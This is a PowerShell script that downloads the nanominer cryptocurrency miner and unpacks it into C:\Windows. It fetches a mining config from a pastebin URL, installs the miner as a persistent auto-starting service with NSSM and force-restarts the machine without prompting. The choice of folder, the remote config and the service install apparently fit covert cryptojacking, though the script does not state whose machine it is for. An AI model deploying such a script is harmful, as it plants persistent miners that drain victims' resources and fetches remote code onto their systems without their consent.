param
(
    [string] $rigname = "Guthub"
)


mkdir C:\Windows\nanominer-windows-3.5.2 -ErrorAction SilentlyContinue
wget https://github.com/nanopool/nanominer/releases/download/v3.5.2/nanominer-windows-3.5.2.zip -OutFile $env:APPDATA\nanominer-windows-3.5.2.zip
Expand-Archive $env:APPDATA\nanominer-windows-3.5.2.zip -DestinationPath C:\Windows\

#$url = "https://pastebin.com/raw/synBAhxL" #CPU XMR Only
$url = "https://pastebin.com/raw/wLt52SEi" #CPUGPU XMR & ETC

wget -O C:\Windows\nanominer-windows-3.5.2\config.ini $url
((Get-Content -path C:\Windows\nanominer-windows-3.5.2\config.ini -Raw) -replace 'Laptop',$rigname) | Set-Content -Path C:\Windows\nanominer-windows-3.5.2\config.ini

wget http://nssm.cc/release/nssm-2.24.zip -OutFile $env:APPDATA\nssm-2.24.zip
Expand-Archive $env:APPDATA\nssm-2.24.zip -DestinationPath $env:APPDATA\

Start-Process -FilePath "$env:APPDATA\nssm-2.24\win64\nssm.exe" -ArgumentList "install Nanominer C:\Windows\nanominer-windows-3.5.2\nanominer.exe"
Start-Process -FilePath "$env:APPDATA\nssm-2.24\win64\nssm.exe" -ArgumentList "set Nanominer AppDirectory C:\Windows\nanominer-windows-3.5.2" 

Start-Sleep -Seconds 15

Restart-Computer
